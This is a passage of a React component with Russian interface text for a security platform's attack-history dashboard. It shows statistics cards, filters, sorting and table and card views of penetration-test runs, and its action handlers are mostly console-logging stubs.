    const handleViewDetails = useCallback((attack: AttackHistoryItem) => {
        setSelectedAttack(attack);
        setShowDetailsDialog(true);
    }, []);

    const handleCloneAttack = useCallback((attack: AttackHistoryItem) => {
        router.push(`/security/attack-builder/create?clone=${attack.id}`);
    }, [router]);

    const handleCompareAttacks = useCallback(() => {
        if (selectedAttacks.length >= 2) {
            setShowCompareDialog(true);
        }
    }, [selectedAttacks]);

    const handleBulkAction = useCallback((action: string) => {
        if (selectedAttacks.length === 0) return;

        setShowBulkActionsDialog(true);
        // Здесь будет логика для различных bulk действий
    }, [selectedAttacks]);

    const handleExport = useCallback((format: string) => {
        // Логика экспорта в различных форматах
        console.log(`Exporting ${filteredAndSortedAttacks.length} attacks in ${format} format`);
    }, [filteredAndSortedAttacks]);

    const handleToggleFavorite = useCallback((attackId: string) => {
        // Логика переключения избранного
        console.log(`Toggling favorite for attack: ${attackId}`);
    }, []);

    const handleToggleBookmark = useCallback((attackId: string) => {
        // Логика переключения закладки
        console.log(`Toggling bookmark for attack: ${attackId}`);
    }, []);

    const handleAddComment = useCallback((attackId: string, comment: string) => {
        // Логика добавления комментария
        console.log(`Adding comment to attack ${attackId}: ${comment}`);
    }, []);

    // Автообновление
    React.useEffect(() => {
        let interval: NodeJS.Timeout;
        if (autoRefresh) {
            interval = setInterval(() => {
                // Логика обновления данных
                console.log('Auto refreshing data...');
            }, refreshInterval * 1000);
        }
        return () => {
            if (interval) clearInterval(interval);
        };
    }, [autoRefresh, refreshInterval]);

    return (
        <TooltipProvider>
            <div className="space-y-6">
                {/* Расширенный заголовок */}
                <div className="flex items-center justify-between">
                    <div className="space-y-2">
                        <h1 className="text-4xl font-bold tracking-tight flex items-center gap-3">
                            <div className="p-2 bg-gradient-to-r from-red-500 to-orange-500 rounded-lg">
                                <Activity className="w-8 h-8 text-white" />
                            </div>
                            {t('title')} - История атак
                        </h1>
                        <p className="text-lg text-muted-foreground">
                            Полная история выполненных атак и тестов на проникновение с расширенной аналитикой
                        </p>
                        <div className="flex items-center gap-4 text-sm text-muted-foreground">
                            <span className="flex items-center gap-1">
                                <Clock className="w-4 h-4" />
                                Последнее обновление: {new Date().toLocaleTimeString('ru-RU')}
                            </span>
                            <span className="flex items-center gap-1">
                                <Database className="w-4 h-4" />
                                {filteredAndSortedAttacks.length} из {attackHistoryData.length} записей
                            </span>
                            <Switch
                                checked={autoRefresh}
                                onCheckedChange={setAutoRefresh}
                            />
                            <span>Автообновление</span>
                        </div>
                    </div>
                    <div className="flex items-center gap-2">
                        <Button variant="outline" size="sm" onClick={() => setShowAnalyticsDialog(true)}>
                            <BarChart3 className="w-4 h-4 mr-2" />
                            Аналитика
                        </Button>
                        <Button variant="outline" size="sm" onClick={() => setShowExportDialog(true)}>
                            <Download className="w-4 h-4 mr-2" />
                            Экспорт
                        </Button>
                        <Button onClick={() => router.push('/security/attack-builder/create')}>
                            <Zap className="w-4 h-4 mr-2" />
                            Новая атака
                        </Button>
                    </div>
                </div>

                {/* Расширенная статистика */}
                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 xl:grid-cols-6 gap-4">
                    <Card>
                        <CardContent className="p-4">
                            <div className="flex items-center justify-between">
                                <div>
                                    <p className="text-sm font-medium text-muted-foreground">Всего атак</p>
                                    <div className="flex items-center gap-2 mt-1">
                                        <p className="text-2xl font-bold">{attackStatistics.total}</p>
                                        <Badge className="bg-blue-100 text-blue-800">
                                            <TrendingUp className="w-3 h-3 mr-1" />
                                            +12%
                                        </Badge>
                                    </div>
                                </div>
                                <Target className="w-8 h-8 text-muted-foreground" />
                            </div>
                        </CardContent>
                    </Card>

                    <Card>
                        <CardContent className="p-4">
                            <div className="flex items-center justify-between">
                                <div>
                                    <p className="text-sm font-medium text-muted-foreground">Успешно завершено</p>
                                    <div className="flex items-center gap-2 mt-1">
                                        <p className="text-2xl font-bold">{attackStatistics.completed}</p>
                                        <Badge className="bg-green-100 text-green-800">
                                            <CheckCircle className="w-3 h-3 mr-1" />
                                            {Math.round((attackStatistics.completed / attackStatistics.total) * 100)}%
                                        </Badge>
                                    </div>
                                </div>
                                <CheckCircle className="w-8 h-8 text-green-600" />
                            </div>
                        </CardContent>
                    </Card>

                    <Card>
                        <CardContent className="p-4">
                            <div className="flex items-center justify-between">
                                <div>
                                    <p className="text-sm font-medium text-muted-foreground">Средний риск</p>
                                    <div className="flex items-center gap-2 mt-1">
                                        <p className="text-2xl font-bold">{attackStatistics.avgRiskScore.toFixed(1)}</p>
                                        <Badge className="bg-orange-100 text-orange-800">
                                            <TrendingUp className="w-3 h-3 mr-1" />
                                            +0.3
                                        </Badge>
                                    </div>
                                </div>
                                <Gauge className="w-8 h-8 text-orange-600" />
                            </div>
                        </CardContent>
                    </Card>

                    <Card>
                        <CardContent className="p-4">
                            <div className="flex items-center justify-between">
                                <div>
                                    <p className="text-sm font-medium text-muted-foreground">Цели скомпрометированы</p>
                                    <div className="flex items-center gap-2 mt-1">
                                        <p className="text-2xl font-bold">{attackStatistics.totalTargetsCompromised}</p>
                                        <Badge className="bg-red-100 text-red-800">
                                            <AlertTriangle className="w-3 h-3 mr-1" />
                                            Критично
                                        </Badge>
                                    </div>
                                </div>
                                <AlertTriangle className="w-8 h-8 text-red-600" />
                            </div>
                        </CardContent>
                    </Card>

                    <Card>
                        <CardContent className="p-4">
                            <div className="flex items-center justify-between">
                                <div>
                                    <p className="text-sm font-medium text-muted-foreground">Общий ущерб</p>
                                    <div className="flex items-center gap-2 mt-1">
                                        <p className="text-xl font-bold">{formatCurrency(attackStatistics.totalCost)}</p>
                                        <Badge className="bg-red-100 text-red-800">
                                            <TrendingUp className="w-3 h-3 mr-1" />
                                            +15%
                                        </Badge>
                                    </div>
                                </div>
                                <Coins className="w-8 h-8 text-yellow-600" />
                            </div>
                        </CardContent>
                    </Card>

                    <Card>
                        <CardContent className="p-4">
                            <div className="flex items-center justify-between">
                                <div>
                                    <p className="text-sm font-medium text-muted-foreground">Всего просмотров</p>
                                    <div className="flex items-center gap-2 mt-1">
                                        <p className="text-2xl font-bold">{attackStatistics.totalViews}</p>
                                        <Badge className="bg-blue-100 text-blue-800">
                                            <Eye className="w-3 h-3 mr-1" />
                                            Live
                                        </Badge>
                                    </div>
                                </div>
                                <Eye className="w-8 h-8 text-blue-600" />
                            </div>
                        </CardContent>
                    </Card>
                </div>

                {/* Расширенные фильтры и поиск */}
                <Card>
                    <CardContent className="p-6">
                        <div className="space-y-4">
                            {/* Основная строка поиска и фильтров */}
                            <div className="flex flex-col lg:flex-row gap-4">
                                <div className="flex-1">
                                    <div className="relative">
                                        <Search className="absolute left-3 top-2.5 h-4 w-4 text-muted-foreground" />
                                        <Input
                                            placeholder="Поиск по названию, цели, пользователю, тегам..."
                                            value={searchQuery}
                                            onChange={(e) => setSearchQuery(e.target.value)}
                                            className="pl-10"
                                        />
                                    </div>
                                </div>

                                <div className="flex gap-2 flex-wrap">
                                    <Select value={statusFilter} onValueChange={setStatusFilter}>
                                        <SelectTrigger className="w-[150px]">
                                            <SelectValue placeholder="Статус" />
                                        </SelectTrigger>
                                        <SelectContent>
                                            <SelectItem value="all">Все статусы</SelectItem>
                                            <SelectItem value="completed">Завершено</SelectItem>
                                            <SelectItem value="running">Выполняется</SelectItem>
                                            <SelectItem value="failed">Неудача</SelectItem>
                                            <SelectItem value="paused">Приостановлено</SelectItem>
                                            <SelectItem value="stopped">Остановлено</SelectItem>
                                            <SelectItem value="scheduled">Запланировано</SelectItem>
                                        </SelectContent>
                                    </Select>

                                    <Select value={severityFilter} onValueChange={setSeverityFilter}>
                                        <SelectTrigger className="w-[150px]">
                                            <SelectValue placeholder="Критичность" />
                                        </SelectTrigger>
                                        <SelectContent>
                                            <SelectItem value="all">Все уровни</SelectItem>
                                            <SelectItem value="critical">Критический</SelectItem>
                                            <SelectItem value="high">Высокий</SelectItem>
                                            <SelectItem value="medium">Средний</SelectItem>
                                            <SelectItem value="low">Низкий</SelectItem>
                                            <SelectItem value="informational">Информационный</SelectItem>
                                        </SelectContent>
                                    </Select>

                                    <Select value={categoryFilter} onValueChange={setCategoryFilter}>
                                        <SelectTrigger className="w-[150px]">
                                            <SelectValue placeholder="Категория" />
                                        </SelectTrigger>
                                        <SelectContent>
                                            <SelectItem value="all">Все категории</SelectItem>
                                            <SelectItem value="red_team">Red Team</SelectItem>
                                            <SelectItem value="blue_team">Blue Team</SelectItem>
                                            <SelectItem value="purple_team">Purple Team</SelectItem>
                                            <SelectItem value="research">Исследования</SelectItem>
                                            <SelectItem value="training">Обучение</SelectItem>
                                            <SelectItem value="compliance">Соответствие</SelectItem>
                                        </SelectContent>
                                    </Select>

                                    <Button
                                        variant="outline"
                                        size="sm"
                                        onClick={() => setShowAdvancedFilters(!showAdvancedFilters)}
                                    >
                                        <Filter className="w-4 h-4 mr-2" />
                                        Расширенные фильтры
                                        {showAdvancedFilters ? <ChevronUp className="w-4 h-4 ml-2" /> : <ChevronDown className="w-4 h-4 ml-2" />}
                                    </Button>
                                </div>
                            </div>

                            {/* Расширенные фильтры */}
                            {showAdvancedFilters && (
                                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 p-4 bg-muted/30 rounded-lg">
                                    <div className="space-y-2">
                                        <Label>Среда выполнения</Label>
                                        <Select value={environmentFilter} onValueChange={setEnvironmentFilter}>
                                            <SelectTrigger>
                                                <SelectValue placeholder="Все среды" />
                                            </SelectTrigger>
                                            <SelectContent>
                                                <SelectItem value="all">Все среды</SelectItem>
                                                <SelectItem value="production">Продакшн</SelectItem>
                                                <SelectItem value="staging">Staging</SelectItem>
                                                <SelectItem value="development">Разработка</SelectItem>
                                                <SelectItem value="testing">Тестирование</SelectItem>
                                            </SelectContent>
                                        </Select>
                                    </div>

                                    <div className="space-y-2">
                                        <Label>Приоритет</Label>
                                        <Select value={priorityFilter} onValueChange={setPriorityFilter}>
                                            <SelectTrigger>
                                                <SelectValue placeholder="Все приоритеты" />
                                            </SelectTrigger>
                                            <SelectContent>
                                                <SelectItem value="all">Все приоритеты</SelectItem>
                                                <SelectItem value="urgent">Срочный</SelectItem>
                                                <SelectItem value="high">Высокий</SelectItem>
                                                <SelectItem value="normal">Обычный</SelectItem>
                                                <SelectItem value="low">Низкий</SelectItem>
                                            </SelectContent>
                                        </Select>
                                    </div>

                                    <div className="space-y-2">
                                        <Label>Диапазон риска: {riskScoreRange[0]} - {riskScoreRange[1]}</Label>
                                        <div className="px-2">
                                            <div className="flex items-center space-x-2">
                                                <span className="text-sm">0</span>
                                                <input
                                                    type="range"
                                                    min="0"
                                                    max="10"
                                                    step="0.1"
                                                    value={riskScoreRange[0]}
                                                    onChange={(e) => setRiskScoreRange([parseFloat(e.target.value), riskScoreRange[1]])}
                                                    className="flex-1"
                                                />
                                                <span className="text-sm">10</span>
                                            </div>
                                        </div>
                                    </div>

                                    <div className="space-y-2">
                                        <Label>Дата начала</Label>
                                        <Input
                                            type="date"
                                            value={dateRange.start}
                                            onChange={(e) => setDateRange(prev => ({ ...prev, start: e.target.value }))}
                                        />
                                    </div>

                                    <div className="space-y-2">
                                        <Label>Дата окончания</Label>
                                        <Input
                                            type="date"
                                            value={dateRange.end}
                                            onChange={(e) => setDateRange(prev => ({ ...prev, end: e.target.value }))}
                                        />
                                    </div>

                                    <div className="space-y-2">
                                        <Label>Теги</Label>
                                        <Popover>
                                            <PopoverTrigger asChild>
                                                <Button variant="outline" className="w-full justify-start">
                                                    <Tag className="w-4 h-4 mr-2" />
                                                    {tagsFilter.length > 0 ? `${tagsFilter.length} тегов` : 'Выберите теги'}
                                                </Button>
                                            </PopoverTrigger>
                                            <PopoverContent className="w-80">
                                                <div className="space-y-2">
                                                    {Array.from(new Set(attackHistoryData.flatMap(a => a.tags))).map(tag => (
                                                        <div key={tag} className="flex items-center space-x-2">
                                                            <Checkbox
                                                                id={tag}
                                                                checked={tagsFilter.includes(tag)}
                                                                onCheckedChange={(checked) => {
                                                                    if (checked) {
                                                                        setTagsFilter(prev => [...prev, tag]);
                                                                    } else {
                                                                        setTagsFilter(prev => prev.filter(t => t !== tag));
                                                                    }
                                                                }}
                                                            />
                                                            <Label htmlFor={tag} className="text-sm">{tag}</Label>
                                                        </div>
                                                    ))}
                                                </div>
                                            </PopoverContent>
                                        </Popover>
                                    </div>
                                </div>
                            )}

                            {/* Панель управления представлением */}
                            <div className="flex items-center justify-between">
                                <div className="flex items-center gap-2">
                                    <span className="text-sm text-muted-foreground">
                                        Показано: {filteredAndSortedAttacks.length} из {attackHistoryData.length}
                                    </span>
                                    {selectedAttacks.length > 0 && (
                                        <>
                                            <Separator orientation="vertical" className="h-4" />
                                            <span className="text-sm text-muted-foreground">
                                                Выбрано: {selectedAttacks.length}
                                            </span>
                                            <Button variant="outline" size="sm" onClick={() => handleCompareAttacks()}>
                                                <BarChart3 className="w-4 h-4 mr-2" />
                                                Сравнить
                                            </Button>
                                            <Button variant="outline" size="sm" onClick={() => handleBulkAction('delete')}>
                                                <Trash2 className="w-4 h-4 mr-2" />
                                                Удалить
                                            </Button>
                                        </>
                                    )}
                                </div>

                                <div className="flex items-center gap-2">
                                    <DropdownMenu>
                                        <DropdownMenuTrigger asChild>
                                            <Button variant="outline" size="sm">
                                                <Columns className="w-4 h-4 mr-2" />
                                                Колонки
                                            </Button>
                                        </DropdownMenuTrigger>
                                        <DropdownMenuContent>
                                            {Object.entries(columnVisibility).map(([key, visible]) => (
                                                <DropdownMenuCheckboxItem
                                                    key={key}
                                                    checked={visible}
                                                    onCheckedChange={(checked) =>
                                                        setColumnVisibility(prev => ({ ...prev, [key]: checked }))
                                                    }
                                                >
                                                    {key}
                                                </DropdownMenuCheckboxItem>
                                            ))}
                                        </DropdownMenuContent>
                                    </DropdownMenu>

                                    <Select value={sortBy} onValueChange={setSortBy}>
                                        <SelectTrigger className="w-[180px]">
                                            <SelectValue />
                                        </SelectTrigger>
                                        <SelectContent>
                                            <SelectItem value="startTime">По времени</SelectItem>
                                            <SelectItem value="name">По названию</SelectItem>
                                            <SelectItem value="successRate">По успешности</SelectItem>
                                            <SelectItem value="riskScore">По риску</SelectItem>
                                            <SelectItem value="impactScore">По воздействию</SelectItem>
                                            <SelectItem value="estimatedCost">По стоимости</SelectItem>
                                        </SelectContent>
                                    </Select>

                                    <Button
                                        variant="outline"
                                        size="sm"
                                        onClick={() => setSortOrder(sortOrder === 'asc' ? 'desc' : 'asc')}
                                    >
                                        {sortOrder === 'asc' ? <SortAsc className="w-4 h-4" /> : <SortDesc className="w-4 h-4" />}
                                    </Button>

                                    <Separator orientation="vertical" className="h-6" />

                                    <div className="flex items-center bg-muted rounded-md p-1">
                                        <Button
                                            variant={viewMode === 'table' ? 'default' : 'ghost'}
                                            size="sm"
                                            onClick={() => setViewMode('table')}
                                        >
                                            <List className="w-4 h-4" />
                                        </Button>
                                        <Button
                                            variant={viewMode === 'cards' ? 'default' : 'ghost'}
                                            size="sm"
                                            onClick={() => setViewMode('cards')}
                                        >
                                            <Grid className="w-4 h-4" />
                                        </Button>
                                        <Button
                                            variant={viewMode === 'timeline' ? 'default' : 'ghost'}
                                            size="sm"
                                            onClick={() => setViewMode('timeline')}
                                        >
                                            <Clock className="w-4 h-4" />
                                        </Button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </CardContent>
                </Card>

                {/* Основное содержимое - Таблица/Карточки/Timeline */}
                <Card>
                    <CardHeader>
                        <CardTitle className="flex items-center justify-between">
                            <span>Атаки ({filteredAndSortedAttacks.length})</span>
                            <div className="flex items-center gap-2">
                                <Button variant="outline" size="sm" onClick={() => setSelectedAttacks([])}>
                                    Сбросить выбор
                                </Button>
                            </div>
                        </CardTitle>
                    </CardHeader>
                    <CardContent>
                        {filteredAndSortedAttacks.length > 0 ? (
                            viewMode === 'table' ? (
                                <ScrollArea className="h-[800px]">
                                    <Table>
                                        <TableHeader>
                                            <TableRow>
                                                <TableHead className="w-12">
                                                    <Checkbox
                                                        checked={selectedAttacks.length === filteredAndSortedAttacks.length}
                                                        onCheckedChange={(checked) => {
                                                            if (checked) {
                                                                setSelectedAttacks(filteredAndSortedAttacks.map(a => a.id));
                                                            } else {
                                                                setSelectedAttacks([]);
                                                            }
                                                        }}
                                                    />
                                                </TableHead>
                                                <TableHead>Атака</TableHead>
                                                <TableHead>Цель</TableHead>
                                                {columnVisibility.status && <TableHead>Статус</TableHead>}
                                                {columnVisibility.severity && <TableHead>Критичность</TableHead>}
                                                {columnVisibility.successRate && <TableHead>Успешность</TableHead>}
                                                {columnVisibility.riskScore && <TableHead>Риск</TableHead>}
                                                {columnVisibility.impactScore && <TableHead>Воздействие</TableHead>}
                                                {columnVisibility.duration && <TableHead>Время</TableHead>}
                                                {columnVisibility.alertsCount && <TableHead>Алерты</TableHead>}
                                                {columnVisibility.cost && <TableHead>Стоимость</TableHead>}
                                                {columnVisibility.user && <TableHead>Пользователь</TableHead>}
                                                <TableHead>Действия</TableHead>
                                            </TableRow>
                                        </TableHeader>
                                        <TableBody>
                                            {filteredAndSortedAttacks.map((attack) => (
                                                <TableRow key={attack.id} className={selectedAttacks.includes(attack.id) ? 'bg-muted/50' : ''}>
                                                    <TableCell>
                                                        <Checkbox
                                                            checked={selectedAttacks.includes(attack.id)}
                                                            onCheckedChange={(checked) => {
                                                                if (checked) {
                                                                    setSelectedAttacks(prev => [...prev, attack.id]);
                                                                } else {
                                                                    setSelectedAttacks(prev => prev.filter(id => id !== attack.id));
                                                                }
                                                            }}
                                                        />
                                                    </TableCell>
                                                    <TableCell>
                                                        <div className="space-y-2">
                                                            <div className="flex items-center gap-2">
                                                                <Badge className={getSeverityColor(attack.severity)}>
                                                                    {attack.severity}
                                                                </Badge>
                                                                <Badge className={getPriorityColor(attack.priority)}>
                                                                    {attack.priority}
                                                                </Badge>
                                                                <div className="flex items-center gap-1">
                                                                    {attack.isFavorite && <Star className="w-3 h-3 text-yellow-500 fill-current" />}
                                                                    {attack.isBookmarked && <Bookmark className="w-3 h-3 text-blue-500 fill-current" />}
                                                                </div>
                                                            </div>
                                                            <div>
                                                                <span className="font-medium">{attack.name}</span>
                                                                <p className="text-sm text-muted-foreground line-clamp-1">{attack.description}</p>
                                                            </div>
                                                            <div className="flex items-center gap-2 text-xs text-muted-foreground">
                                                                <Badge className="bg-blue-100 text-blue-800">
                                                                    {attack.category.replace('_', ' ')}
                                                                </Badge>
                                                                <Badge className="bg-green-100 text-green-800">
                                                                    {attack.environment}
                                                                </Badge>
                                                            </div>
                                                            <div className="flex flex-wrap gap-1">
                                                                {attack.tags.slice(0, 3).map((tag) => (
                                                                    <Badge key={tag} className="text-xs bg-gray-100 text-gray-800">
                                                                        {tag}
                                                                    </Badge>
                                                                ))}
                                                                {attack.tags.length > 3 && (
                                                                    <Badge className="text-xs bg-gray-100 text-gray-800">
                                                                        +{attack.tags.length - 3}
                                                                    </Badge>
                                                                )}
                                                            </div>
                                                        </div>
                                                    </TableCell>
                                                    <TableCell>
                                                        <div className="space-y-1">
                                                            <div className="flex items-center gap-2">
                                                                <Target className="w-4 h-4 text-muted-foreground" />
                                                                <span className="font-medium">{attack.target}</span>
                                                            </div>
                                                            <p className="text-sm text-muted-foreground">
                                                                {attack.targetType.replace('_', ' ')}
                                                            </p>
                                                            <div className="text-xs text-muted-foreground">
                                                                {attack.attackType.replace('_', ' ')}
                                                            </div>
                                                        </div>
                                                    </TableCell>
                                                    {columnVisibility.status && (
                                                        <TableCell>
                                                            <div className="flex items-center gap-2">
                                                                {getStatusIcon(attack.status)}
                                                                <Badge className={getStatusColor(attack.status)}>
                                                                    {t(attack.status)}
                                                                </Badge>
                                                            </div>
                                                        </TableCell>
                                                    )}
                                                    {columnVisibility.severity && (
                                                        <TableCell>
                                                            <Badge className={getSeverityColor(attack.severity)}>
                                                                {attack.severity}
                                                            </Badge>
                                                        </TableCell>
                                                    )}
                                                    {columnVisibility.successRate && (
                                                        <TableCell>
                                                            <div className="space-y-1">
                                                                <div className="flex items-center justify-between">
                                                                    <span className="text-sm font-medium">{attack.successRate}%</span>
                                                                    <span className="text-xs text-muted-foreground">
                                                                        {attack.targetsCompromised}/{attack.totalTargets}
                                                                    </span>
                                                                </div>
                                                                <Progress
                                                                    value={attack.successRate}
                                                                    className="h-1"
                                                                />
                                                            </div>
                                                        </TableCell>
                                                    )}
                                                    {columnVisibility.riskScore && (
                                                        <TableCell>
                                                            <div className="flex items-center gap-2">
                                                                <span className="font-medium">{attack.riskScore.toFixed(1)}</span>
                                                                <div className="w-16 h-2 bg-gray-200 rounded-full">
                                                                    <div
                                                                        className="h-2 bg-gradient-to-r from-green-500 via-yellow-500 to-red-500 rounded-full"
                                                                        style={{ width: `${attack.riskScore * 10}%` }}
                                                                    />
                                                                </div>
                                                            </div>
                                                        </TableCell>
                                                    )}
                                                    {columnVisibility.impactScore && (
                                                        <TableCell>
                                                            <span className="font-medium">{attack.impactScore.toFixed(1)}</span>
                                                        </TableCell>
                                                    )}
                                                    {columnVisibility.duration && (
                                                        <TableCell>
                                                            <div className="space-y-1">
                                                                <p className="text-sm">{formatDate(attack.startTime)}</p>
                                                                {attack.duration && (
                                                                    <p className="text-sm text-muted-foreground">{attack.duration}</p>
                                                                )}
                                                            </div>
                                                        </TableCell>
                                                    )}
                                                    {columnVisibility.alertsCount && (
                                                        <TableCell>
                                                            <div className="flex items-center gap-1">
                                                                <Bell className="w-4 h-4 text-muted-foreground" />
                                                                <span>{attack.alertsTriggered}</span>
                                                            </div>
                                                        </TableCell>
                                                    )}
                                                    {columnVisibility.cost && (
                                                        <TableCell>
                                                            <span className="font-medium text-red-600">
                                                                {formatCurrency(attack.estimatedCost)}
                                                            </span>
                                                        </TableCell>
                                                    )}
                                                    {columnVisibility.user && (
                                                        <TableCell>
                                                            <div className="flex items-center gap-2">
                                                                <Avatar className="w-6 h-6">
                                                                    <AvatarFallback className="text-xs">
                                                                        {attack.createdBy.charAt(0).toUpperCase()}
                                                                    </AvatarFallback>
                                                                </Avatar>
                                                                <span className="text-sm">{attack.createdBy.split('@')[0]}</span>
                                                            </div>
                                                        </TableCell>
                                                    )}
                                                    <TableCell>
                                                        <div className="flex items-center gap-1">
                                                            <Tooltip>
                                                                <TooltipTrigger asChild>
                                                                    <Button
                                                                        variant="ghost"
                                                                        size="sm"
                                                                        onClick={() => handleToggleFavorite(attack.id)}
                                                                    >
                                                                        <Star className={`w-4 h-4 ${attack.isFavorite ? 'text-yellow-500 fill-current' : ''}`} />
                                                                    </Button>
                                                                </TooltipTrigger>
                                                                <TooltipContent>Добавить в избранное</TooltipContent>
                                                            </Tooltip>

                                                            <Tooltip>
                                                                <TooltipTrigger asChild>
                                                                    <Button
                                                                        variant="ghost"
                                                                        size="sm"
                                                                        onClick={() => handleToggleBookmark(attack.id)}
                                                                    >
                                                                        <Bookmark className={`w-4 h-4 ${attack.isBookmarked ? 'text-blue-500 fill-current' : ''}`} />
                                                                    </Button>
                                                                </TooltipTrigger>
                                                                <TooltipContent>Добавить в закладки</TooltipContent>
                                                            </Tooltip>

                                                            <DropdownMenu>
                                                                <DropdownMenuTrigger asChild>
                                                                    <Button variant="ghost" className="h-8 w-8 p-0">
                                                                        <MoreHorizontal className="h-4 w-4" />
                                                                    </Button>
                                                                </DropdownMenuTrigger>
                                                                <DropdownMenuContent align="end">
                                                                    <DropdownMenuLabel>Действия</DropdownMenuLabel>
                                                                    <DropdownMenuItem onClick={() => handleViewDetails(attack)}>
                                                                        <Eye className="mr-2 h-4 w-4" />
                                                                        Просмотреть детали
                                                                    </DropdownMenuItem>
                                                                    <DropdownMenuItem onClick={() => setSelectedAttack(attack)} disabled={!attack.reportUrl}>
                                                                        <FileText className="mr-2 h-4 w-4" />
                                                                        Скачать отчет
                                                                    </DropdownMenuItem>
                                                                    <DropdownMenuItem onClick={() => handleCloneAttack(attack)}>
                                                                        <Copy className="mr-2 h-4 w-4" />
                                                                        Клонировать
                                                                    </DropdownMenuItem>
                                                                    <DropdownMenuItem onClick={() => {
                                                                        setSelectedAttack(attack);
                                                                        setShowCommentsDialog(true);
                                                                    }}>
                                                                        <MessageCircle className="mr-2 h-4 w-4" />
                                                                        Комментарии ({attack.commentsCount})
                                                                    </DropdownMenuItem>
                                                                    <DropdownMenuSeparator />
                                                                    <DropdownMenuSub>
                                                                        <DropdownMenuSubTrigger>
                                                                            <Share className="mr-2 h-4 w-4" />
                                                                            Поделиться
                                                                        </DropdownMenuSubTrigger>
                                                                        <DropdownMenuSubContent>
                                                                            <DropdownMenuItem>
                                                                                <Mail className="mr-2 h-4 w-4" />
                                                                                Email
                                                                            </DropdownMenuItem>
                                                                            <DropdownMenuItem>
                                                                                <Slack className="mr-2 h-4 w-4" />
                                                                                Slack
                                                                            </DropdownMenuItem>
                                                                            <DropdownMenuItem>
                                                                                <MessageSquare className="mr-2 h-4 w-4" />
                                                                                Teams
                                                                            </DropdownMenuItem>
                                                                        </DropdownMenuSubContent>
                                                                    </DropdownMenuSub>
                                                                    <DropdownMenuSeparator />
                                                                    <DropdownMenuItem className="text-red-600">
                                                                        <Trash2 className="mr-2 h-4 w-4" />
                                                                        Удалить
                                                                    </DropdownMenuItem>
                                                                </DropdownMenuContent>
                                                            </DropdownMenu>
                                                        </div>
                                                    </TableCell>
                                                </TableRow>
                                            ))}
                                        </TableBody>
                                    </Table>
                                </ScrollArea>
                            ) : viewMode === 'cards' ? (
                                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                                    {filteredAndSortedAttacks.map((attack) => (
                                        <Card key={attack.id} className={`hover:shadow-lg transition-shadow ${selectedAttacks.includes(attack.id) ? 'ring-2 ring-primary' : ''}`}>
                                            <CardHeader className="pb-3">
                                                <div className="flex items-start justify-between">
                                                    <div className="space-y-2 flex-1">
                                                        <div className="flex items-center gap-2">
                                                            <Checkbox
                                                                checked={selectedAttacks.includes(attack.id)}
                                                                onCheckedChange={(checked) => {
                                                                    if (checked) {
                                                                        setSelectedAttacks(prev => [...prev, attack.id]);
                                                                    } else {
                                                                        setSelectedAttacks(prev => prev.filter(id => id !== attack.id));
                                                                    }
                                                                }}
                                                            />
                                                            <Badge className={getSeverityColor(attack.severity)}>
                                                                {attack.severity}
                                                            </Badge>
                                                            {attack.isFavorite && <Star className="w-4 h-4 text-yellow-500 fill-current" />}
                                                        </div>
                                                        <CardTitle className="text-lg line-clamp-2">{attack.name}</CardTitle>
                                                        <p className="text-sm text-muted-foreground line-clamp-2">{attack.description}</p>
                                                    </div>
                                                </div>
                                            </CardHeader>
                                            <CardContent className="space-y-4">
                                                <div className="space-y-2">
                                                    <div className="flex items-center gap-2 text-sm">
                                                        <Target className="w-4 h-4 text-muted-foreground" />
                                                        <span className="font-medium">{attack.target}</span>
                                                    </div>
                                                    <div className="flex items-center gap-2">
                                                        {getStatusIcon(attack.status)}
                                                        <Badge className={getStatusColor(attack.status)}>
                                                            {t(attack.status)}
                                                        </Badge>
                                                    </div>
                                                </div>

                                                <div className="space-y-2">
                                                    <div className="flex justify-between items-center">
                                                        <span className="text-sm text-muted-foreground">Успешность</span>
                                                        <span className="font-medium">{attack.successRate}%</span>
                                                    </div>
                                                    <Progress value={attack.successRate} className="h-2" />
                                                </div>

                                                <div className="flex justify-between items-center">
                                                    <span className="text-sm text-muted-foreground">Риск</span>
                                                    <div className="flex items-center gap-2">
                                                        <span className="font-medium">{attack.riskScore.toFixed(1)}</span>
                                                        <div className="w-16 h-2 bg-gray-200 rounded-full">
                                                            <div
                                                                className="h-2 bg-gradient-to-r from-green-500 via-yellow-500 to-red-500 rounded-full"
                                                                style={{ width: `${attack.riskScore * 10}%` }}
                                                            />
                                                        </div>
                                                    </div>
                                                </div>

                                                <div className="space-y-2">
                                                    <div className="flex items-center justify-between text-sm">
                                                        <span className="text-muted-foreground">Цели</span>
                                                        <span>{attack.targetsCompromised}/{attack.totalTargets}</span>
                                                    </div>
                                                    <div className="flex items-center justify-between text-sm">
                                                        <span className="text-muted-foreground">Алерты</span>
                                                        <Badge className="bg-red-100 text-red-800">
                                                            <Bell className="w-3 h-3 mr-1" />
                                                            {attack.alertsTriggered}
                                                        </Badge>
                                                    </div>
                                                    <div className="flex items-center justify-between text-sm">
                                                        <span className="text-muted-foreground">Стоимость</span>
                                                        <span className="font-medium text-red-600">
                                                            {formatCurrency(attack.estimatedCost)}
                                                        </span>
                                                    </div>
                                                </div>

                                                <div className="flex flex-wrap gap-1">
                                                    {attack.tags.slice(0, 3).map((tag) => (
                                                        <Badge key={tag} className="text-xs bg-gray-100 text-gray-800">
                                                            {tag}
                                                        </Badge>
                                                    ))}
                                                    {attack.tags.length > 3 && (
                                                        <Badge className="text-xs bg-gray-100 text-gray-800">
                                                            +{attack.tags.length - 3}
                                                        </Badge>
                                                    )}
                                                </div>

                                                <div className="flex items-center justify-between pt-2 border-t">
                                                    <div className="flex items-center gap-2">
                                                        <Avatar className="w-6 h-6">
                                                            <AvatarFallback className="text-xs">
                                                                {attack.createdBy.charAt(0).toUpperCase()}
                                                            </AvatarFallback>
                                                        </Avatar>
                                                        <span className="text-sm">{attack.createdBy.split('@')[0]}</span>
                                                    </div>
                                                    <div className="flex items-center gap-1">
                                                        <Button
                                                            variant="ghost"
                                                            size="sm"
                                                            onClick={() => handleViewDetails(attack)}
                                                        >
                                                            <Eye className="w-4 h-4" />
                                                        </Button>
                                                        <Button
                                                            variant="ghost"
                                                            size="sm"
                                                            onClick={() => handleToggleFavorite(attack.id)}
                                                        >
                                                            <Star className={`w-4 h-4 ${attack.isFavorite ? 'text-yellow-500 fill-current' : ''}`} />
                                                        </Button>
                                                        <DropdownMenu>
                                                            <DropdownMenuTrigger asChild>
